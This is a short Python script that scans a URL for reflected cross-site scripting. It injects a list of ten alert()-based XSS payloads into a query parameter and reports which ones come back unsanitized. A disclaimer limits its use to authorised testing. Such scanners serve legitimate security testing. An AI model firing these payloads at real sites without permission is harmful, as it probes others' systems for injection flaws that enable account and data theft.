"""
XSS Scanner Script

This script performs basic XSS (Cross-Site Scripting) vulnerability testing on a given URL by injecting 
a list of payloads into a query parameter and checking whether the response reflects the input unsanitized.

⚠️ Disclaimer: This tool is for educational and ethical testing purposes only.
Use only on websites you own or have explicit permission to test.

Author: Bar Cohen
"""

import requests

# List of common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(`XSS`);'></iframe>",
    "<marquee onstart=alert('XSS')>",
    "<math><mtext></mtext><script>alert('XSS')</script></math>",
    "<object data='javascript:alert(\"XSS\")'></object>",
    "<input autofocus onfocus=alert('XSS')>"
]

def test_xss_injection(url, payload):
    separator = "&" if "?" in url else "?"
    test_url = f"{url}{separator}input={payload}"
    try:
        response = requests.get(test_url, timeout=5)
        if payload in response.text:
            print(f"[!] Potential XSS vulnerability with payload: {payload}")
        else:
            print(f"[-] Payload not reflected: {payload}")
    except Exception as e:
        print(f"[ERROR] Failed to test payload {payload}: {e}")

def scan_xss(url):
    for payload in xss_payloads:
        print(f"[•] Testing payload: {payload}")
        test_xss_injection(url, payload)

# Example usage
if __name__ == "__main__":
    target_url = "http://example.com/search"  # Replace with your target test URL
    scan_xss(target_url)
